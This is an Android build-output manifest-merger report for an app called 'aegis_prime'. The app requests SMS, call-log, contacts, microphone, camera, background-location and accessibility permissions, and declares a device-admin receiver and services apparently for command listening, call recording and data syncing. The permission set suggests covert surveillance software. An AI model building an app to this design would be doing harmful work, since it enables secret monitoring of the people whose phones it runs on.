android-nativo/intermediates/manifest_merge_blame_file/debug/processDebugMainManifest/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.example.aegis_prime"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src\main\AndroidManifest.xml:4:5-67
11-->src\main\AndroidManifest.xml:4:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src\main\AndroidManifest.xml:5:5-79
12-->src\main\AndroidManifest.xml:5:22-76
13    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
13-->src\main\AndroidManifest.xml:6:5-76
13-->src\main\AndroidManifest.xml:6:22-73
14    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
14-->src\main\AndroidManifest.xml:7:5-79
14-->src\main\AndroidManifest.xml:7:22-76
15    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
15-->src\main\AndroidManifest.xml:8:5-81
15-->src\main\AndroidManifest.xml:8:22-78
16    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
16-->src\main\AndroidManifest.xml:9:5-85
16-->src\main\AndroidManifest.xml:9:22-82
17    <uses-permission android:name="android.permission.READ_SMS" />
17-->src\main\AndroidManifest.xml:10:5-67
17-->src\main\AndroidManifest.xml:10:22-64
18    <uses-permission android:name="android.permission.RECEIVE_SMS" />
18-->src\main\AndroidManifest.xml:11:5-70
18-->src\main\AndroidManifest.xml:11:22-67
19    <uses-permission android:name="android.permission.READ_CALL_LOG" />
19-->src\main\AndroidManifest.xml:12:5-72
19-->src\main\AndroidManifest.xml:12:22-69
20    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
20-->src\main\AndroidManifest.xml:13:5-75
20-->src\main\AndroidManifest.xml:13:22-72
21    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
21-->src\main\AndroidManifest.xml:14:5-81
21-->src\main\AndroidManifest.xml:14:22-78
22    <uses-permission android:name="android.permission.READ_CONTACTS" />
22-->src\main\AndroidManifest.xml:15:5-72
22-->src\main\AndroidManifest.xml:15:22-69
23    <uses-permission android:name="android.permission.RECORD_AUDIO" />
23-->src\main\AndroidManifest.xml:16:5-71
23-->src\main\AndroidManifest.xml:16:22-68
24    <uses-permission android:name="android.permission.CAMERA" />
24-->src\main\AndroidManifest.xml:17:5-65
24-->src\main\AndroidManifest.xml:17:22-62
25    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
25-->src\main\AndroidManifest.xml:18:5-81
25-->src\main\AndroidManifest.xml:18:22-78
26    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
26-->src\main\AndroidManifest.xml:19:5-80
26-->src\main\AndroidManifest.xml:19:22-77
27    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
27-->src\main\AndroidManifest.xml:20:5-78
27-->src\main\AndroidManifest.xml:20:22-75
28    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
28-->src\main\AndroidManifest.xml:21:5-77
28-->src\main\AndroidManifest.xml:21:22-74
29    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
29-->src\main\AndroidManifest.xml:22:5-81
29-->src\main\AndroidManifest.xml:22:22-78
30    <uses-permission android:name="android.permission.WAKE_LOCK" />
30-->src\main\AndroidManifest.xml:23:5-68
30-->src\main\AndroidManifest.xml:23:22-65
31    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
31-->src\main\AndroidManifest.xml:25:5-85
31-->src\main\AndroidManifest.xml:25:22-82
32
33    <permission
33-->[androidx.core:core:1.13.0] AndroidManifest.xml:22:5-24:47
34        android:name="com.example.aegis_prime.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
34-->[androidx.core:core:1.13.0] AndroidManifest.xml:23:9-81
35        android:protectionLevel="signature" />
35-->[androidx.core:core:1.13.0] AndroidManifest.xml:24:9-44
36
37    <uses-permission android:name="com.example.aegis_prime.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
37-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:5-97
37-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:22-94
38
39    <application
39-->src\main\AndroidManifest.xml:27:5-78:19
40        android:name="com.example.aegis_prime.AegisPrimeApplication"
40-->src\main\AndroidManifest.xml:28:9-46
41        android:allowBackup="true"
41-->src\main\AndroidManifest.xml:29:9-35
42        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
42-->[androidx.core:core:1.13.0] AndroidManifest.xml:28:18-86
43        android:debuggable="true"
44        android:extractNativeLibs="false"
45        android:icon="@drawable/ic_launcher"
45-->src\main\AndroidManifest.xml:30:9-45
46        android:label="@string/app_name"
46-->src\main\AndroidManifest.xml:31:9-41
47        android:roundIcon="@drawable/ic_launcher_round"
47-->src\main\AndroidManifest.xml:32:9-56
48        android:supportsRtl="true"
48-->src\main\AndroidManifest.xml:33:9-35
49        android:theme="@style/Theme.Aegisprime"
49-->src\main\AndroidManifest.xml:34:9-48
50        android:usesCleartextTraffic="true" >
50-->src\main\AndroidManifest.xml:35:9-44
51        <activity
51-->src\main\AndroidManifest.xml:37:9-45:20
52            android:name="com.example.aegis_prime.MainActivity"
52-->src\main\AndroidManifest.xml:38:13-41
53            android:exported="true"
53-->src\main\AndroidManifest.xml:39:13-36
54            android:launchMode="singleTop" >
54-->src\main\AndroidManifest.xml:40:13-43
55            <intent-filter>
55-->src\main\AndroidManifest.xml:41:13-44:29
56                <action android:name="android.intent.action.MAIN" />
56-->src\main\AndroidManifest.xml:42:17-69
56-->src\main\AndroidManifest.xml:42:25-66
57
58                <category android:name="android.intent.category.LAUNCHER" />
58-->src\main\AndroidManifest.xml:43:17-77
58-->src\main\AndroidManifest.xml:43:27-74
59            </intent-filter>
60        </activity>
61
62        <receiver
62-->src\main\AndroidManifest.xml:47:9-57:20
63            android:name="com.example.aegis_prime.services.DeviceAdmin"
63-->src\main\AndroidManifest.xml:48:13-49
64            android:exported="true"
64-->src\main\AndroidManifest.xml:49:13-36
65            android:permission="android.permission.BIND_DEVICE_ADMIN" >
65-->src\main\AndroidManifest.xml:50:13-70
66            <meta-data
66-->src\main\AndroidManifest.xml:51:13-53:65
67                android:name="android.app.device_admin"
67-->src\main\AndroidManifest.xml:52:17-56
68                android:resource="@xml/device_admin_policies" />
68-->src\main\AndroidManifest.xml:53:17-62
69
70            <intent-filter>
70-->src\main\AndroidManifest.xml:54:13-56:29
71                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
71-->src\main\AndroidManifest.xml:55:17-82
71-->src\main\AndroidManifest.xml:55:25-79
72            </intent-filter>
73        </receiver>
74
75        <service
75-->src\main\AndroidManifest.xml:59:9-70:19
76            android:name="com.example.aegis_prime.services.AegisAccessibilityService"
76-->src\main\AndroidManifest.xml:60:13-63
77            android:exported="false"
77-->src\main\AndroidManifest.xml:61:13-37
78            android:label="@string/app_name"
78-->src\main\AndroidManifest.xml:62:13-45
79            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
79-->src\main\AndroidManifest.xml:63:13-79
80            <meta-data
80-->src\main\AndroidManifest.xml:64:13-66:72
81                android:name="android.accessibilityservice"
81-->src\main\AndroidManifest.xml:65:17-60
82                android:resource="@xml/accessibility_service_config" />
82-->src\main\AndroidManifest.xml:66:17-69
83
84            <intent-filter>
84-->src\main\AndroidManifest.xml:67:13-69:29
85                <action android:name="android.accessibilityservice.AccessibilityService" />
85-->src\main\AndroidManifest.xml:68:17-92
85-->src\main\AndroidManifest.xml:68:25-89
86            </intent-filter>
87        </service>
88        <service android:name="com.example.aegis_prime.services.LocationService" />
88-->src\main\AndroidManifest.xml:72:9-61
88-->src\main\AndroidManifest.xml:72:18-58
89        <service android:name="com.example.aegis_prime.services.CommandListenerService" />
89-->src\main\AndroidManifest.xml:73:9-68
89-->src\main\AndroidManifest.xml:73:18-65
90        <service android:name="com.example.aegis_prime.services.DataSyncService" />
90-->src\main\AndroidManifest.xml:74:9-61
90-->src\main\AndroidManifest.xml:74:18-58
91        <service android:name="com.example.aegis_prime.services.CallRecordingService" />
91-->src\main\AndroidManifest.xml:75:9-66
91-->src\main\AndroidManifest.xml:75:18-63
92        <service
92-->src\main\AndroidManifest.xml:76:9-97
93            android:name="com.example.aegis_prime.services.DeviceStatusUpdaterService"
93-->src\main\AndroidManifest.xml:76:18-69
94            android:exported="false" />
94-->src\main\AndroidManifest.xml:76:70-94
95        <service
95-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:24:9-33:19
96            android:name="androidx.camera.core.impl.MetadataHolderService"
96-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:25:13-75
97            android:enabled="false"
97-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:26:13-36
98            android:exported="false" >
98-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:27:13-37
99            <meta-data
99-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:30:13-32:89
100                android:name="androidx.camera.core.impl.MetadataHolderService.DEFAULT_CONFIG_PROVIDER"
100-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:31:17-103
101                android:value="androidx.camera.camera2.Camera2Config$DefaultProvider" />
101-->[androidx.camera:camera-camera2:1.3.3] AndroidManifest.xml:32:17-86
102        </service>
103
104        <activity
104-->[com.google.android.gms:play-services-base:18.3.0] AndroidManifest.xml:20:9-22:45
105            android:name="com.google.android.gms.common.api.GoogleApiActivity"
105-->[com.google.android.gms:play-services-base:18.3.0] AndroidManifest.xml:20:19-85
106            android:exported="false"
106-->[com.google.android.gms:play-services-base:18.3.0] AndroidManifest.xml:22:19-43
107            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
107-->[com.google.android.gms:play-services-base:18.3.0] AndroidManifest.xml:21:19-78
108
109        <meta-data
109-->[com.google.android.gms:play-services-basement:18.3.0] AndroidManifest.xml:21:9-23:69
110            android:name="com.google.android.gms.version"
110-->[com.google.android.gms:play-services-basement:18.3.0] AndroidManifest.xml:22:13-58
111            android:value="@integer/google_play_services_version" />
111-->[com.google.android.gms:play-services-basement:18.3.0] AndroidManifest.xml:23:13-66
112
113        <provider
113-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:24:9-32:20
114            android:name="androidx.startup.InitializationProvider"
114-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:25:13-67
115            android:authorities="com.example.aegis_prime.androidx-startup"
115-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:26:13-68
116            android:exported="false" >
116-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:27:13-37
117            <meta-data
117-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
118                android:name="androidx.emoji2.text.EmojiCompatInitializer"
118-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
119                android:value="androidx.startup" />
119-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
120            <meta-data
120-->[io.github.jan-tennert.supabase:storage-kt-android-debug:2.3.0] AndroidManifest.xml:14:13-16:52
121                android:name="io.github.jan.supabase.storage.SupabaseInitializer"
121-->[io.github.jan-tennert.supabase:storage-kt-android-debug:2.3.0] AndroidManifest.xml:15:17-82
122                android:value="androidx.startup" />
122-->[io.github.jan-tennert.supabase:storage-kt-android-debug:2.3.0] AndroidManifest.xml:16:17-49
123            <meta-data
123-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.3.0] AndroidManifest.xml:14:13-16:52
124                android:name="io.github.jan.supabase.gotrue.SupabaseInitializer"
124-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.3.0] AndroidManifest.xml:15:17-81
125                android:value="androidx.startup" />
125-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.3.0] AndroidManifest.xml:16:17-49
126            <meta-data
126-->[androidx.lifecycle:lifecycle-process:2.8.1] AndroidManifest.xml:29:13-31:52
127                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
127-->[androidx.lifecycle:lifecycle-process:2.8.1] AndroidManifest.xml:30:17-78
128                android:value="androidx.startup" />
128-->[androidx.lifecycle:lifecycle-process:2.8.1] AndroidManifest.xml:31:17-49
129            <meta-data
129-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:29:13-31:52
130                android:name="com.russhwolf.settings.SettingsInitializer"
130-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:30:17-74
131                android:value="androidx.startup" />
131-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:31:17-49
132            <meta-data
132-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:29:13-31:52
133                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
133-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:30:17-85
134                android:value="androidx.startup" />
134-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:31:17-49
135        </provider>
136
137        <receiver
137-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:34:9-52:20
138            android:name="androidx.profileinstaller.ProfileInstallReceiver"
138-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:35:13-76
139            android:directBootAware="false"
139-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:36:13-44
140            android:enabled="true"
140-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:37:13-35
141            android:exported="true"
141-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:38:13-36
142            android:permission="android.permission.DUMP" >
142-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:39:13-57
143            <intent-filter>
143-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:40:13-42:29
144                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
144-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:17-91
144-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:25-88
145            </intent-filter>
146            <intent-filter>
146-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:43:13-45:29
147                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
147-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:17-85
147-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:25-82
148            </intent-filter>
149            <intent-filter>
149-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:46:13-48:29
150                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
150-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:17-88
150-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:25-85
151            </intent-filter>
152            <intent-filter>
152-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:49:13-51:29
153                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
153-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:17-95
153-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:25-92
154            </intent-filter>
155        </receiver>
156    </application>
157
158</manifest>